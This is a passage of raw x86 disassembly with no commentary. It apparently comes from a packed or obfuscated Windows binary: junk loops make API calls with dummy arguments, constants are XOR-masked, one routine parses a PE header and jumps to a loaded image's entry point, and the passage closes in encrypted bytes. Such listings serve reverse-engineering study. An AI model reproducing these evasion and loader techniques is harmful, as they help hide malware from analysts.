  409da6:	mov    ecx,DWORD PTR [ebp-0x4]
  409da9:	inc    edx
  409daa:	imul   ecx,ecx,0x7f659e30
  409db0:	mov    DWORD PTR [ebp-0x4],ecx
  409db3:	mov    edx,DWORD PTR ds:0x412364
  409db9:	xor    edx,DWORD PTR ds:0x4245ae
  409dbf:	mov    DWORD PTR ds:0x412364,edx
  409dc5:	or     DWORD PTR [ebp-0x4],esi
  409dc8:	mov    DWORD PTR ds:0x415105,0x4568
  409dd2:	mov    ecx,DWORD PTR [ebp-0x4]
  409dd5:	mov    edx,DWORD PTR ds:0x415115
  409ddb:	mov    edx,DWORD PTR [ebp-0xc]
  409dde:	cmp    ecx,DWORD PTR [edx]
  409de0:	jne    0x40a327
  409de6:	inc    eax
  409de7:	mov    DWORD PTR ds:0x4245ae,0x6f03
  409df1:	cmp    eax,0x4
  409df4:	jb     0x409d43
  409dfa:	xor    eax,eax
  409dfc:	sbb    DWORD PTR ds:0x412360,edx
  409e02:	shl    DWORD PTR [ebp-0x4],1
  409e05:	and    DWORD PTR [ebp-0x4],edi
  409e08:	mov    ecx,DWORD PTR [ebp-0x4]
  409e0b:	and    DWORD PTR ds:0x417e4d,0x0
  409e15:	mov    edx,DWORD PTR ds:0x417e4d
  409e1b:	inc    edx
  409e1c:	mov    DWORD PTR ds:0x417e4d,edx
  409e22:	cmp    DWORD PTR ds:0x417e4d,0xa
  409e29:	jne    0x409e4c
  409e2f:	push   DWORD PTR [ebp-0x20]
  409e32:	push   0x8411
  409e37:	push   0x41ad5b
  409e3c:	push   0x41adfd
  409e41:	push   0x1dc1
  409e46:	call   DWORD PTR ds:0x40d010
  409e4c:	cmp    DWORD PTR ds:0x417e4d,0x9
  409e53:	jne    0x409e68
  409e59:	xor    edx,edx
  409e5b:	or     edx,DWORD PTR ds:0x417e4d
  409e61:	inc    edx
  409e62:	mov    DWORD PTR ds:0x417e4d,edx
  409e68:	cmp    DWORD PTR ds:0x417e4d,0x19
  409e6f:	jb     0x409e15
  409e75:	mov    edx,DWORD PTR ds:0x417eaa
  409e7b:	mov    edx,DWORD PTR [edx]
  409e7d:	xor    DWORD PTR ds:0x41abda,edx
  409e83:	imul   ecx,ecx,0x7f659e30
  409e89:	mov    edx,DWORD PTR ds:0x412374
  409e8f:	sub    DWORD PTR ds:0x415111,edx
  409e95:	mov    DWORD PTR [ebp-0x4],ecx
  409e98:	and    edx,edx
  409e9a:	or     DWORD PTR [ebp-0x4],esi
  409e9d:	mov    ecx,DWORD PTR [ebp-0x4]
  409ea0:	mov    edx,DWORD PTR [ebp-0xc]
  409ea3:	mov    DWORD PTR ds:0x4245ba,0xa9e
  409ead:	cmp    ecx,DWORD PTR [edx]
  409eaf:	jne    0x40a327
  409eb5:	mov    DWORD PTR ds:0x4150fd,0x72ef
  409ebf:	inc    eax
  409ec0:	cmp    eax,0x4
  409ec3:	mov    DWORD PTR ds:0x412370,0x6303
  409ecd:	jb     0x409dfc
  409ed3:	xor    eax,eax
  409ed5:	and    DWORD PTR ds:0x4150fd,0x0
  409edf:	xor    ecx,ecx
  409ee1:	add    ecx,DWORD PTR ds:0x4150fd
  409ee7:	inc    ecx
  409ee8:	mov    DWORD PTR ds:0x4150fd,ecx
  409eee:	cmp    DWORD PTR ds:0x4150fd,0x28
  409ef5:	jne    0x409f04
  409efb:	push   DWORD PTR [ebp-0x24]
  409efe:	call   DWORD PTR ds:0x40d014
  409f04:	cmp    DWORD PTR ds:0x4150fd,0x18
  409f0b:	jb     0x409edf
  409f11:	add    DWORD PTR ds:0x417e59,0x412378
  409f1b:	shl    DWORD PTR [ebp-0x4],1
  409f1e:	and    DWORD PTR [ebp-0x4],edi
  409f21:	and    DWORD PTR ds:0x412360,0x0
  409f2b:	jmp    0x409f3f
  409f30:	xor    edx,edx
  409f32:	or     edx,DWORD PTR ds:0x412360
  409f38:	inc    edx
  409f39:	mov    DWORD PTR ds:0x412360,edx
  409f3f:	cmp    DWORD PTR ds:0x412360,0x11
  409f46:	jae    0x409f85
  409f4c:	cmp    DWORD PTR ds:0x412360,0x1a
  409f53:	jne    0x409f80
  409f59:	push   0x415119
  409f5e:	push   0x8b4a
  409f63:	push   DWORD PTR [ebp-0x24]
  409f66:	push   0x89fe
  409f6b:	push   0x7f12
  409f70:	push   0x7c49
  409f75:	push   0x1205
  409f7a:	call   DWORD PTR ds:0x40d200
  409f80:	jmp    0x409f30
  409f85:	mov    ecx,DWORD PTR [ebp-0x4]
  409f88:	imul   ecx,ecx,0x7f659e30
  409f8e:	mov    DWORD PTR [ebp-0x4],ecx
  409f91:	or     DWORD PTR [ebp-0x4],esi
  409f94:	mov    ecx,DWORD PTR [ebp-0x4]
  409f97:	mov    edx,DWORD PTR [ebp-0xc]
  409f9a:	mov    DWORD PTR ds:0x4245b6,0x2f25
  409fa4:	cmp    ecx,DWORD PTR [edx]
  409fa6:	mov    DWORD PTR ds:0x412358,0x1252
  409fb0:	jne    0x40a327
  409fb6:	inc    eax
  409fb7:	cmp    eax,0x4
  409fba:	mov    DWORD PTR ds:0x4245ca,0x48e
  409fc4:	jb     0x409ed5
  409fca:	mov    DWORD PTR ds:0x417e55,0x10
  409fd4:	cmp    DWORD PTR ds:0x417e55,0x0
  409fdb:	je     0x40a032
  409fe1:	cmp    DWORD PTR ds:0x417e55,0x19
  409fe8:	jne    0x40a00e
  409fee:	push   DWORD PTR [ebp-0x24]
  409ff1:	push   0x4245ca
  409ff6:	push   DWORD PTR [ebp-0x28]
  409ff9:	push   0x41ada3
  409ffe:	push   0x6e83
  40a003:	push   0x54b6
  40a008:	call   DWORD PTR ds:0x40d204
  40a00e:	mov    edx,DWORD PTR ds:0x417e55
  40a014:	dec    edx
  40a015:	mov    DWORD PTR ds:0x417e55,edx
  40a01b:	jmp    0x409fd4
  40a020:	mov    ecx,DWORD PTR ds:0x40eecc
  40a026:	mov    edx,DWORD PTR ds:0x417eba
  40a02c:	sub    ecx,edx
  40a02e:	imul   ecx,DWORD PTR [ecx+edx*1]
  40a032:	xor    eax,eax
  40a034:	shl    DWORD PTR [ebp-0x4],1
  40a037:	and    DWORD PTR [ebp-0x4],edi
  40a03a:	or     ecx,ecx
  40a03c:	mov    ecx,DWORD PTR [ebp-0x4]
  40a03f:	xor    edx,DWORD PTR ds:0x417e51
  40a045:	imul   ecx,ecx,0x7f659e30
  40a04b:	mov    DWORD PTR ds:0x417e49,0x1d
  40a055:	cmp    DWORD PTR ds:0x417e49,0x0
  40a05c:	je     0x40a0b0
  40a062:	cmp    DWORD PTR ds:0x417e49,0x7
  40a069:	jne    0x40a07a
  40a06f:	push   0x45c2
  40a074:	call   DWORD PTR ds:0x40d208
  40a07a:	cmp    DWORD PTR ds:0x417e49,0x8
  40a081:	jne    0x40a094
  40a087:	mov    edx,DWORD PTR ds:0x417e49
  40a08d:	dec    edx
  40a08e:	mov    DWORD PTR ds:0x417e49,edx
  40a094:	mov    edx,DWORD PTR ds:0x417e49
  40a09a:	dec    edx
  40a09b:	mov    DWORD PTR ds:0x417e49,edx
  40a0a1:	jmp    0x40a055
  40a0a6:	adc    DWORD PTR ds:0x417e45,0x449b
  40a0b0:	mov    DWORD PTR [ebp-0x4],ecx
  40a0b3:	or     ecx,edx
  40a0b5:	or     DWORD PTR [ebp-0x4],esi
  40a0b8:	mov    edx,0x1393
  40a0bd:	mov    ecx,DWORD PTR [ebp-0x4]
  40a0c0:	mov    edx,DWORD PTR [ebp-0xc]
  40a0c3:	mov    DWORD PTR ds:0x41abda,0x516c
  40a0cd:	cmp    ecx,DWORD PTR [edx]
  40a0cf:	jne    0x40a327
  40a0d5:	mov    DWORD PTR ds:0x415111,0x4e99
  40a0df:	inc    eax
  40a0e0:	mov    DWORD PTR ds:0x4245c2,0x1c73
  40a0ea:	cmp    eax,0x4
  40a0ed:	jb     0x40a034
  40a0f3:	xor    eax,eax
  40a0f5:	or     DWORD PTR ds:0x41236c,0x38d4
  40a0ff:	shl    DWORD PTR [ebp-0x4],1
  40a102:	and    DWORD PTR [ebp-0x4],edi
  40a105:	and    ecx,DWORD PTR ds:0x417e59
  40a10b:	mov    ecx,DWORD PTR [ebp-0x4]
  40a10e:	adc    DWORD PTR ds:0x4245be,0x729e
  40a118:	imul   ecx,ecx,0x7f659e30
  40a11e:	adc    edx,0x9b0
  40a124:	mov    DWORD PTR [ebp-0x4],ecx
  40a127:	xor    edx,edx
  40a129:	or     edx,DWORD PTR ds:0x417e55
  40a12f:	xor    DWORD PTR ds:0x4245c6,edx
  40a135:	or     DWORD PTR [ebp-0x4],esi
  40a138:	mov    ecx,DWORD PTR [ebp-0x4]
  40a13b:	mov    edx,DWORD PTR [ebp-0xc]
  40a13e:	mov    DWORD PTR ds:0x4245b6,0xce5
  40a148:	cmp    ecx,DWORD PTR [edx]
  40a14a:	jne    0x40a327
  40a150:	mov    DWORD PTR ds:0x41abd6,0x18a3
  40a15a:	inc    eax
  40a15b:	mov    DWORD PTR ds:0x4245ae,0x5769
  40a165:	cmp    eax,0x4
  40a168:	mov    DWORD PTR ds:0x412358,0x5fb5
  40a172:	jb     0x40a0f5
  40a178:	sbb    ecx,DWORD PTR ds:0x417e59
  40a17e:	xor    eax,eax
  40a180:	mov    DWORD PTR ds:0x412360,0x14
  40a18a:	cmp    DWORD PTR ds:0x412360,0x0
  40a191:	je     0x40a1c1
  40a197:	cmp    DWORD PTR ds:0x412360,0x19
  40a19e:	jne    0x40a1af
  40a1a4:	push   0x2f20
  40a1a9:	call   DWORD PTR ds:0x40d018
  40a1af:	mov    edx,DWORD PTR ds:0x412360
  40a1b5:	dec    edx
  40a1b6:	mov    DWORD PTR ds:0x412360,edx
  40a1bc:	jmp    0x40a18a
  40a1c1:	shl    DWORD PTR [ebp-0x4],1
  40a1c4:	mov    DWORD PTR ds:0x41abe2,0x14
  40a1ce:	cmp    DWORD PTR ds:0x41abe2,0x0
  40a1d5:	je     0x40a233
  40a1db:	cmp    DWORD PTR ds:0x41abe2,0x5
  40a1e2:	jne    0x40a203
  40a1e8:	push   0x1b4e
  40a1ed:	push   DWORD PTR [ebp-0x1c]
  40a1f0:	push   0x1704
  40a1f5:	push   0x41abf4
  40a1fa:	push   DWORD PTR [ebp-0x10]
  40a1fd:	call   DWORD PTR ds:0x40d01c
  40a203:	cmp    DWORD PTR ds:0x41abe2,0x6
  40a20a:	jne    0x40a21d
  40a210:	mov    edx,DWORD PTR ds:0x41abe2
  40a216:	dec    edx
  40a217:	mov    DWORD PTR ds:0x41abe2,edx
  40a21d:	xor    edx,edx
  40a21f:	add    edx,DWORD PTR ds:0x41abe2
  40a225:	dec    edx
  40a226:	mov    DWORD PTR ds:0x41abe2,edx
  40a22c:	jmp    0x40a1ce
  40a231:	neg    edx
  40a233:	and    DWORD PTR [ebp-0x4],edi
  40a236:	mov    ecx,DWORD PTR [ebp-0x4]
  40a239:	neg    edx
  40a23b:	imul   ecx,ecx,0x7f659e30
  40a241:	xor    edx,DWORD PTR ds:0x41abd2
  40a247:	mov    DWORD PTR [ebp-0x4],ecx
  40a24a:	adc    DWORD PTR ds:0x4245b6,ebx
  40a250:	or     DWORD PTR [ebp-0x4],esi
  40a253:	mov    edx,0x77ca
  40a258:	mov    ecx,DWORD PTR [ebp-0x4]
  40a25b:	mov    edx,DWORD PTR [ebp-0xc]
  40a25e:	mov    DWORD PTR ds:0x41510d,0x1bcb
  40a268:	cmp    ecx,DWORD PTR [edx]
  40a26a:	mov    DWORD PTR ds:0x412354,0x3513
  40a274:	jne    0x40a327
  40a27a:	inc    eax
  40a27b:	cmp    eax,0x4
  40a27e:	mov    DWORD PTR ds:0x417e49,0x110e
  40a288:	jb     0x40a180
  40a28e:	xor    eax,eax
  40a290:	shl    DWORD PTR [ebp-0x4],1
  40a293:	and    DWORD PTR [ebp-0x4],edi
  40a296:	mov    ecx,DWORD PTR [ebp-0x4]
  40a299:	imul   ecx,ecx,0x7f659e30
  40a29f:	mov    DWORD PTR [ebp-0x4],ecx
  40a2a2:	or     DWORD PTR [ebp-0x4],esi
  40a2a5:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2a8:	mov    edx,DWORD PTR [ebp-0xc]
  40a2ab:	cmp    ecx,DWORD PTR [edx]
  40a2ad:	jne    0x40a327
  40a2b3:	inc    eax
  40a2b4:	cmp    eax,0x4
  40a2b7:	jb     0x40a290
  40a2bd:	inc    ebx
  40a2be:	cmp    ebx,0x10
  40a2c1:	jb     0x409b50
  40a2c7:	mov    ebx,0xf89c8538
  40a2cc:	mov    DWORD PTR [ebp-0xc],ebx
  40a2cf:	mov    DWORD PTR [ebp-0x8],0xf89c853b
  40a2d6:	lea    eax,[ebp-0x1c]
  40a2d9:	mov    DWORD PTR [ebp-0x18],eax
  40a2dc:	lea    eax,[ebp-0x20]
  40a2df:	mov    DWORD PTR [ebp-0x10],eax
  40a2e2:	mov    eax,ds:0x40d5d0
  40a2e7:	mov    eax,DWORD PTR [eax+0x1c8]
  40a2ed:	mov    eax,DWORD PTR [eax]
  40a2ef:	mov    ecx,DWORD PTR [ebp-0x10]
  40a2f2:	mov    esi,0x7510859
  40a2f7:	xor    eax,esi
  40a2f9:	mov    edi,0x32729f
  40a2fe:	add    eax,edi
  40a300:	mov    DWORD PTR [ecx],eax
  40a302:	mov    eax,ds:0x40d854
  40a307:	cmp    eax,0x23d14057
  40a30c:	mov    eax,DWORD PTR [ebp-0x8]
  40a30f:	je     0x40a32e
  40a315:	mov    ecx,DWORD PTR [ebp-0xc]
  40a318:	xor    eax,esi
  40a31a:	add    eax,edi
  40a31c:	imul   eax,ecx
  40a31f:	mov    DWORD PTR [ebp-0xc],eax
  40a322:	jmp    0x40a371
  40a327:	xor    eax,eax
  40a329:	jmp    0x40a5d0
  40a32e:	xor    eax,esi
  40a330:	add    eax,edi
  40a332:	mov    ds:0x40d6e0,eax
  40a337:	mov    eax,DWORD PTR [ebp-0xc]
  40a33a:	xor    eax,esi
  40a33c:	add    eax,edi
  40a33e:	mov    ds:0x40d854,eax
  40a343:	mov    eax,DWORD PTR [ebp-0x8]
  40a346:	mov    ecx,DWORD PTR ds:0x40d6e0
  40a34c:	xor    eax,esi
  40a34e:	add    eax,edi
  40a350:	cmp    ecx,eax
  40a352:	jne    0x40a371
  40a358:	push   0x40d72c
  40a35d:	call   DWORD PTR ds:0x40d1ec
  40a363:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a369:	mov    ecx,DWORD PTR [ecx+0x198]
  40a36f:	mov    DWORD PTR [ecx],eax
  40a371:	mov    eax,ds:0x40d5d0
  40a376:	mov    eax,DWORD PTR [eax+0x18c]
  40a37c:	mov    eax,DWORD PTR [eax]
  40a37e:	mov    DWORD PTR [ebp-0x24],eax
  40a381:	mov    eax,0xf89c853c
  40a386:	mov    DWORD PTR [ebp-0x28],eax
  40a389:	mov    DWORD PTR [ebp-0x28],eax
  40a38c:	mov    DWORD PTR [ebp-0x28],eax
  40a38f:	mov    DWORD PTR [ebp-0x10],ebx
  40a392:	mov    DWORD PTR [ebp-0x28],eax
  40a395:	mov    DWORD PTR [ebp-0x28],0xf89c8530
  40a39c:	mov    ebx,DWORD PTR [ebp-0xc]
  40a39f:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3a2:	mov    edx,DWORD PTR [ebp-0x8]
  40a3a5:	xor    edx,esi
  40a3a7:	xor    ecx,esi
  40a3a9:	add    ecx,edx
  40a3ab:	mov    edx,DWORD PTR [ebp-0x8]
  40a3ae:	xor    ebx,esi
  40a3b0:	xor    edx,esi
  40a3b2:	add    ebx,edi
  40a3b4:	lea    ecx,[ecx+edx*1+0x9757dd]
  40a3bb:	cmp    ebx,ecx
  40a3bd:	ja     0x40a41e
  40a3c3:	mov    eax,DWORD PTR [ebp-0x8]
  40a3c6:	xor    eax,esi
  40a3c8:	lea    eax,[eax+ebx*1+0x32729f]
  40a3cf:	push   eax
  40a3d0:	mov    eax,DWORD PTR [ebp-0x10]
  40a3d3:	xor    eax,esi
  40a3d5:	lea    eax,[ebp+eax*1+0x3272a7]
  40a3dc:	push   eax
  40a3dd:	mov    eax,ds:0x40d5d0
  40a3e2:	push   DWORD PTR [eax+0x1bc]
  40a3e8:	call   0x40742d
  40a3ed:	mov    eax,DWORD PTR [ebp-0x8]
  40a3f0:	xor    eax,esi
  40a3f2:	lea    ebx,[ebx+eax*1+0x32729f]
  40a3f9:	mov    eax,DWORD PTR [ebp-0x8]
  40a3fc:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3ff:	xor    ecx,esi
  40a401:	xor    eax,esi
  40a403:	add    eax,ecx
  40a405:	mov    ecx,DWORD PTR [ebp-0x8]
  40a408:	xor    ecx,esi
  40a40a:	lea    eax,[eax+ecx*1+0x9757dd]
  40a411:	cmp    ebx,eax
  40a413:	jbe    0x40a3c3
  40a419:	mov    eax,0xf89c853c
  40a41e:	mov    ecx,DWORD PTR [ebp+0xc]
  40a421:	mov    DWORD PTR ds:0x40d454,ecx
  40a427:	mov    ecx,DWORD PTR [ebp+0x10]
  40a42a:	mov    DWORD PTR ds:0x40d6a8,ecx
  40a430:	mov    ecx,DWORD PTR ds:0x40d454
  40a436:	mov    edx,DWORD PTR [ebp-0x18]
  40a439:	sub    ecx,edi
  40a43b:	xor    ecx,esi
  40a43d:	mov    DWORD PTR [edx],ecx
  40a43f:	mov    ecx,DWORD PTR [ebp-0x1c]
  40a442:	cmp    ecx,0xf89c853b
  40a448:	je     0x40a4a5
  40a44e:	mov    ecx,DWORD PTR [ebp-0xc]
  40a451:	mov    edx,DWORD PTR [ebp-0x20]
  40a454:	xor    ecx,esi
  40a456:	add    ecx,edi
  40a458:	cmp    ecx,edx
  40a45a:	je     0x40a4a5
  40a460:	mov    eax,ds:0x40d5d0
  40a465:	mov    eax,DWORD PTR [eax+0x194]
  40a46b:	mov    ecx,DWORD PTR [eax]
  40a46d:	mov    eax,DWORD PTR [ecx+0x3c]
  40a470:	push   DWORD PTR ds:0x40d6a8
  40a476:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40a47a:	push   DWORD PTR ds:0x40d454
  40a480:	add    eax,ecx
  40a482:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a488:	mov    ecx,DWORD PTR [ecx+0x194]
  40a48e:	push   DWORD PTR [ecx]
  40a490:	call   eax
  40a492:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a498:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40a49e:	mov    DWORD PTR [ecx],eax
  40a4a0:	jmp    0x40a5b5
  40a4a5:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4a8:	mov    edx,DWORD PTR [ebp-0x24]
  40a4ab:	xor    ecx,esi
  40a4ad:	add    ecx,edi
  40a4af:	cmp    ecx,edx
  40a4b1:	jne    0x40a598
  40a4b7:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4ba:	xor    ecx,esi
  40a4bc:	add    ecx,edi
  40a4be:	mov    DWORD PTR ds:0x40d654,ecx
  40a4c4:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4c7:	xor    ecx,esi
  40a4c9:	add    ecx,edi
  40a4cb:	mov    DWORD PTR ds:0x40d64c,ecx
  40a4d1:	mov    ecx,DWORD PTR [ebp-0x8]
  40a4d4:	mov    DWORD PTR [ebp-0x10],ecx
  40a4d7:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4da:	mov    DWORD PTR [ebp+0xc],ecx
  40a4dd:	mov    ecx,DWORD PTR [ebp+0xc]
  40a4e0:	xor    ecx,esi
  40a4e2:	add    ecx,edi
  40a4e4:	mov    DWORD PTR [ebp+0xc],ecx
  40a4e7:	mov    ecx,DWORD PTR ds:0x40d450
  40a4ed:	mov    ecx,DWORD PTR [ecx]
  40a4ef:	mov    DWORD PTR [ebp+0xc],ecx
  40a4f2:	mov    ecx,DWORD PTR ds:0x40d658
  40a4f8:	mov    ecx,DWORD PTR [ecx]
  40a4fa:	mov    DWORD PTR [ebp-0x18],ecx
  40a4fd:	mov    DWORD PTR [ebp+0x10],0xf89c8738
  40a504:	mov    ecx,DWORD PTR [ebp+0x10]
  40a507:	xor    ecx,esi
  40a509:	add    ecx,edi
  40a50b:	mov    DWORD PTR [ebp+0x10],ecx
  40a50e:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a514:	mov    DWORD PTR [ebp+0x10],ecx
  40a517:	mov    ecx,DWORD PTR [ebp+0xc]
  40a51a:	mov    DWORD PTR [ebp+0xc],ecx
  40a51d:	mov    ecx,DWORD PTR [ebp+0xc]
  40a520:	push   0x4
  40a522:	pop    edx
  40a523:	sub    edx,ecx
  40a525:	add    edx,DWORD PTR [ebp-0x18]
  40a528:	mov    DWORD PTR [ebp-0x28],0xf89c85f8
  40a52f:	mov    DWORD PTR [ebp+0x10],edx
  40a532:	mov    DWORD PTR [ebp-0x74],eax
  40a535:	mov    eax,DWORD PTR [ebp+0xc]
  40a538:	mov    DWORD PTR [ebp-0x70],eax
  40a53b:	mov    eax,DWORD PTR [ebp+0x10]
  40a53e:	mov    DWORD PTR [ebp-0x6c],eax
  40a541:	mov    eax,DWORD PTR [ebp-0x28]
  40a544:	xor    eax,esi
  40a546:	add    eax,edi
  40a548:	mov    DWORD PTR [ebp-0x68],eax
  40a54b:	lea    eax,[ebp-0x30]
  40a54e:	mov    DWORD PTR [ebp-0x64],eax
  40a551:	mov    eax,DWORD PTR [ebp-0x74]
  40a554:	xor    eax,esi
  40a556:	add    eax,edi
  40a558:	mov    DWORD PTR [ebp-0x74],eax
  40a55b:	lea    eax,[ebp-0x74]
  40a55e:	push   eax
  40a55f:	mov    eax,DWORD PTR [ebp-0x10]
  40a562:	xor    eax,esi
  40a564:	add    eax,edi
  40a566:	push   eax
  40a567:	mov    eax,ds:0x40d5f0
  40a56c:	push   0x40d546
  40a571:	push   DWORD PTR [eax]
  40a573:	call   0x40ae4d
  40a578:	xor    esi,esi
  40a57a:	mov    eax,DWORD PTR [ebp+0x10]
  40a57d:	sub    eax,esi
  40a57f:	push   eax
  40a580:	mov    eax,DWORD PTR [ebp+0xc]
  40a583:	add    eax,esi
  40a585:	push   eax
  40a586:	call   0x4059cb
  40a58b:	inc    esi
  40a58c:	cmp    esi,0x52
  40a58f:	jb     0x40a57a
  40a595:	mov    eax,DWORD PTR [ebp-0x10]
  40a598:	call   0x404704
  40a59d:	lea    eax,[ebp+0x4]
  40a5a0:	mov    DWORD PTR [ebp-0x2c],eax
  40a5a3:	mov    eax,DWORD PTR [ebp-0x14]
  40a5a6:	mov    eax,DWORD PTR [ebp-0x8]
  40a5a9:	push   DWORD PTR [ebp-0xc]
  40a5ac:	lea    eax,[ebp-0x2c]
  40a5af:	push   eax
  40a5b0:	call   0x407c0a
  40a5b5:	mov    eax,ds:0x40d5d0
  40a5ba:	push   0x4
  40a5bc:	add    eax,0x1cc
  40a5c1:	push   eax
  40a5c2:	lea    eax,[ebp-0x14]
  40a5c5:	push   eax
  40a5c6:	call   0x40742d
  40a5cb:	mov    eax,DWORD PTR [ebp-0x14]
  40a5ce:	mov    eax,DWORD PTR [eax]
  40a5d0:	pop    edi
  40a5d1:	pop    esi
  40a5d2:	pop    ebx
  40a5d3:	leave  
  40a5d4:	ret    0xc
  40a5d7:	push   ebp
  40a5d8:	mov    ebp,esp
  40a5da:	sub    esp,0x14
  40a5dd:	leave  
  40a5de:	ret    0x4
  40a5e1:	push   ebp
  40a5e2:	mov    ebp,esp
  40a5e4:	push   ecx
  40a5e5:	or     eax,0x5cec
  40a5ea:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  40a5f1:	add    eax,0x77b5
  40a5f6:	mov    eax,DWORD PTR [ebp+0x8]
  40a5f9:	mov    al,BYTE PTR [eax]
  40a5fb:	add    DWORD PTR ds:0x412354,0x2449
  40a605:	add    al,0x34
  40a607:	sbb    DWORD PTR ds:0x41237c,0x412364
  40a611:	xor    al,0x4a
  40a613:	cmp    al,0xcb
  40a615:	mov    DWORD PTR ds:0x4245c2,0x6064
  40a61f:	jne    0x40a6b9
  40a625:	mov    eax,DWORD PTR [ebp+0x8]
  40a628:	mov    ecx,DWORD PTR [ebp+0x8]
  40a62b:	add    ecx,DWORD PTR [eax+0x3c]
  40a62e:	mov    edx,0x7510859
  40a633:	and    DWORD PTR ds:0x412368,0x0
  40a63d:	mov    eax,ds:0x412368
  40a642:	inc    eax
  40a643:	mov    ds:0x412368,eax
  40a648:	cmp    DWORD PTR ds:0x412368,0xe
  40a64f:	jne    0x40a663
  40a655:	push   0x41236c
  40a65a:	push   DWORD PTR [ebp-0x10]
  40a65d:	call   DWORD PTR ds:0x40d398
  40a663:	cmp    DWORD PTR ds:0x412368,0xd
  40a66a:	jne    0x40a67b
  40a670:	mov    eax,ds:0x412368
  40a675:	inc    eax
  40a676:	mov    ds:0x412368,eax
  40a67b:	cmp    DWORD PTR ds:0x412368,0x1f
  40a682:	jb     0x40a63d
  40a688:	mov    DWORD PTR [ebp+0x8],ecx
  40a68b:	mov    eax,DWORD PTR [ebp-0x4]
  40a68e:	xor    eax,edx
  40a690:	push   esi
  40a691:	mov    esi,DWORD PTR [ebp+0x8]
  40a694:	mov    ecx,0x32729f
  40a699:	add    eax,ecx
  40a69b:	cmp    DWORD PTR [esi+0x54],eax
  40a69e:	pop    esi
  40a69f:	je     0x40a6ad
  40a6a5:	mov    eax,DWORD PTR [ebp+0x8]
  40a6a8:	jmp    0x40a6c6
  40a6ad:	mov    eax,DWORD PTR [ebp-0x4]
  40a6b0:	xor    eax,edx
  40a6b2:	add    eax,ecx
  40a6b4:	jmp    0x40a6c6
  40a6b9:	mov    eax,DWORD PTR [ebp-0x4]
  40a6bc:	xor    eax,0x7510859
  40a6c1:	add    eax,0x32729f
  40a6c6:	leave  
  40a6c7:	ret    0x4
  40a6ca:	push   ebp
  40a6cb:	mov    ebp,esp
  40a6cd:	push   ecx
  40a6ce:	mov    DWORD PTR ds:0x417e41,0x1a
  40a6d8:	cmp    DWORD PTR ds:0x417e41,0x0
  40a6df:	je     0x40a739
  40a6e5:	cmp    DWORD PTR ds:0x417e41,0x4
  40a6ec:	jne    0x40a70f
  40a6f2:	push   0x6416
  40a6f7:	push   0x57a6
  40a6fc:	push   0x7327
  40a701:	push   DWORD PTR [ebp-0xc]
  40a704:	push   0x1809
  40a709:	call   DWORD PTR ds:0x40d39c
  40a70f:	cmp    DWORD PTR ds:0x417e41,0x5
  40a716:	jne    0x40a727
  40a71c:	mov    eax,ds:0x417e41
  40a721:	dec    eax
  40a722:	mov    ds:0x417e41,eax
  40a727:	mov    eax,ds:0x417e41
  40a72c:	dec    eax
  40a72d:	mov    ds:0x417e41,eax
  40a732:	jmp    0x40a6d8
  40a737:	sub    edx,edx
  40a739:	push   ecx
  40a73a:	sub    edx,eax
  40a73c:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  40a743:	and    DWORD PTR ds:0x412358,0x0
  40a74d:	jmp    0x40a761
  40a752:	xor    edx,edx
  40a754:	add    edx,DWORD PTR ds:0x412358
  40a75a:	inc    edx
  40a75b:	mov    DWORD PTR ds:0x412358,edx
  40a761:	cmp    DWORD PTR ds:0x412358,0x11
  40a768:	jae    0x40a79c
  40a76e:	cmp    DWORD PTR ds:0x412358,0x18
  40a775:	jne    0x40a791
  40a77b:	push   0x4012
  40a780:	push   DWORD PTR [ebp-0xc]
  40a783:	push   0x7b7f
  40a788:	push   DWORD PTR [ebp-0xc]
  40a78b:	call   DWORD PTR ds:0x40d020
  40a791:	jmp    0x40a752
  40a796:	sub    DWORD PTR ds:0x4245ae,ebx
  40a79c:	mov    DWORD PTR [ebp-0x4],0xf89c853b
  40a7a3:	jmp    0x40a91b
  40a7a8:	(bad)  
  40a7a9:	jmp    0x40a73d
  40a7ab:	aam    0x78
  40a7ad:	push   ebp
  40a7ae:	pop    ecx
  40a7af:	jnp    0x40a756
  40a7b1:	fwait
  40a7b2:	jne    0x40a830
  40a7b4:	inc    ecx
  40a7b5:	(bad)  
  40a7b6:	xor    bl,ch
  40a7b8:	add    eax,0xc57e7e25
  40a7bd:	jg     0x40a83d
  40a7bf:	jle    0x40a80b
  40a7c1:	(bad)
  40a7c5:	ins    DWORD PTR es:[edi],dx
  40a7c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7c7:	std    
  40a7c8:	pop    ebp
  40a7c9:	and    bh,0x83
  40a7cc:	mov    cl,bh
  40a7ce:	int    0xa7
  40a7d0:	mov    gs,eax
  40a7d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7d3:	adc    eax,DWORD PTR [eax+0x1642a7ff]
  40a7d9:	pop    DWORD PTR [ecx]
  40a7db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7dc:	pop    ss
  40a7dd:	inc    ecx
  40a7de:	push   es
  40a7df:	aas    
  40a7e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a7e1:	js     0x40a776
  40a7e3:	outs   dx,BYTE PTR ds:[esi]
  40a7e4:	xor    esi,edi
  40a7e6:	push   ebp
  40a7e7:	push   ecx
  40a7e8:	jg     0x40a793
  40a7ea:	dec    ebp
  40a7eb:	xchg   edx,eax
  40a7ec:	les    edx,FWORD PTR [esi+esi*8-0x50]
  40a7f0:	xchg   ebx,eax
  40a7f1:	jae    0x40a826
  40a7f3:	jge    0x40a7f9
  40a7f5:	mov    eax,ds:0xbb60bb25
  40a7fa:	mov    ebx,0x7e9cc151
  40a7ff:	xor    al,0xce
  40a801:	fiadd  DWORD PTR [edi-0x10]
  40a804:	repz jmp 0x2434:0xa82b5d7d
  40a80c:	mov    eax,0xcf9448cc
  40a811:	jbe    0x40a7fd
  40a813:	jg     0x40a82b
